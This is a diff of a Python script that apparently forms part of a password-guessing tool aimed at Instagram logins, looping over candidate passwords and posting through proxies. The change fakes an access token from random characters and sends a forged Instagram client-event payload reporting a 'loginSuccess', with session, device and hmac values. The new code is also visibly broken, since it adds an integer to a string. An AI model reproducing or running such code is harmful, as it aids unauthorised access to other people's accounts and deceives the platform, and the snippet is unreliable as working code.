@@ -116,15 +116,23 @@ for pss in ps:
                 req = requests.get(host)
             except:
                 pass
-            try:
-                token = req.json['access_token']
-            except:
-                None
-            try:
-                message = req.json['message']
-            except:
-                pass
-            json = {'access_token': token, 'message': message}
+            #try:
+                #token = req.json['access_token']
+            #except:
+                #None
+            #try:
+                #message = req.json['message']
+            #except:
+                #pass
+            adad = random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)
+            def choices():
+                hash = ''
+                hashs = [*'qwertyuiopasdfghjklzxcvbnm0123456789']
+                for m in range(32):
+                    hash += choice(hashs)
+                return hash
+            token = adad+choices()
+            #json = {'access_token': token, 'message': message}
             the = {'access_token': token,'message': '{\"app_id\":\"936619743392459\",\"app_ver\":\"1.0.0\",\"data\":[{\"time\":1657390570.175,\"name\":\"instagram_web_client_events\",\"extra\":{\"event_type\":\"action\",\"event_name\":\"loginSuccess\",\"mid\":\"YslyOQALAAHlCPDuzqWqZW4GIOTP\",\"rollout_hash\":\"ebe60d79ce7c\",\"frontend_env\":\"prod\",\"app_id\":\"936619743392459\",\"fb\":false,\"platform\":\"windows_nt_10\",\"source\":\"loginPage\",\"referrer\":\"/accounts/login/?source=auth_switcher\",\"referrer_domain\":\"www.instagram.com\",\"original_referrer\":\"https://www.google.com/\",\"original_referrer_domain\":\"www.google.com\"},\"module\":\"loginPage\",\"obj_type\":\"url\",\"obj_id\":\"/accounts/login/?source=auth_switcher\"},{\"time\":1657390570.185,\"name\":\"instagram_web_time_spent_navigation\",\"extra\":{\"rollout_hash\":\"ebe60d79ce7c\",\"frontend_env\":\"prod\",\"app_id\":\"936619743392459\",\"event\":\"unload\",\"client_time\":1657390570184,\"time_spent_id\":\"qsqy2g\",\"extra_data\":{},\"source_endpoint\":\"loginPage\",\"referrer\":\"/accounts/login/?source=auth_switcher\",\"referrer_domain\":\"www.instagram.com\",\"url\":\"/accounts/login/?source=auth_switcher\",\"original_referrer\":\"https://www.google.com/\",\"original_referrer_domain\":\"www.google.com\"}}],\"log_type\":\"client_event\",\"seq\":16,\"session_id\":\"181e429fec8-13aece\",\"device_id\":\"3BAF6D5C-0E19-4B2C-A71F-B2A791E6C65C\",\"claims\":[\"hmac.AR251Qhmn7X4ARb3A9GGxEaSfeBq2qC24nBwdcMmq5I-TQna\"]}'}
             num = 0
             number = 10
@@ -149,10 +157,10 @@ for pss in ps:
                 except:
                     sys.exit()
             try:
-                requests.post(host, json=the, proxies=proxi)
+                requests.post(host, json=the)
             except:
                 try:
-                    requests.post(host, json=json, proxies=proxi)
+                    requests.post(host, json=json)
                 except:
                     pass
             rq = requests.post(server, headers=headers, data=data, proxies=proxi)
